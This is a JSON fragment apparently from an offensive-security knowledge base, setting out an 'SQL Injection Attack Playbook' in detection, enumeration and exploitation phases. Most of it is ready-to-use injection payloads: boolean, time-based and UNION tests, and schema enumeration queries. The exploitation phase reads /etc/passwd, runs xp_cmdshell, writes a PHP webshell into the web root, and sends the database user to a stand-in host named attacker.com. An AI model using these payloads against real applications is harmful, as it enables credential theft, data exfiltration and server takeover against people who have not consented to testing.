    "sql_injection": {
      "name": "SQL Injection Attack Playbook",
      "phases": {
        "1_detection": {
          "steps": [
            "Inject single quotes and observe error messages",
            "Test boolean conditions (1=1, 1=2) and compare responses",
            "Use time-based blind techniques (SLEEP, WAITFOR, pg_sleep)",
            "Test UNION-based injection with ORDER BY to determine columns",
            "Check for stacked queries support"
          ],
          "payloads": {
            "detection": ["' OR '1'='1", "' AND '1'='2", "1' ORDER BY 100--", "'; WAITFOR DELAY '0:0:5'--"],
            "union": ["' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--", "' UNION SELECT 1,2,3--"],
            "blind": ["' AND SUBSTRING((SELECT database()),1,1)='a'--", "' AND (SELECT COUNT(*) FROM users)>0--"]
          }
        },
        "2_enumeration": {
          "steps": [
            "Extract database version and type",
            "Enumerate databases and tables",
            "Identify column names and data types",
            "Extract sensitive data from target tables",
            "Map database structure for privilege escalation"
          ],
          "payloads": {
            "version": ["@@version", "version()", "banner"],
            "databases": ["SELECT schema_name FROM information_schema.schemata", "SELECT name FROM master..sysdatabases"],
            "tables": ["SELECT table_name FROM information_schema.tables WHERE table_schema='db'", "SHOW TABLES"],
            "columns": ["SELECT column_name FROM information_schema.columns WHERE table_name='users'"]
          }
        },
        "3_exploitation": {
          "steps": [
            "Extract user credentials",
            "Read sensitive files via LOAD_FILE/UTL_FILE",
            "Write webshell to filesystem if possible",
            "Escalate privileges within database",
            "Pivot to other systems using database links"
          ],
          "payloads": {
            "file_read": ["' UNION SELECT LOAD_FILE('/etc/passwd')--", "'; EXEC xp_cmdshell 'type C:\\windows\\win.ini'--"],
            "file_write": ["' INTO OUTFILE '/var/www/html/shell.php'--", "UTL_HTTP.REQUEST('http://attacker.com/'||user)--"]
          }
        }
      }
    },
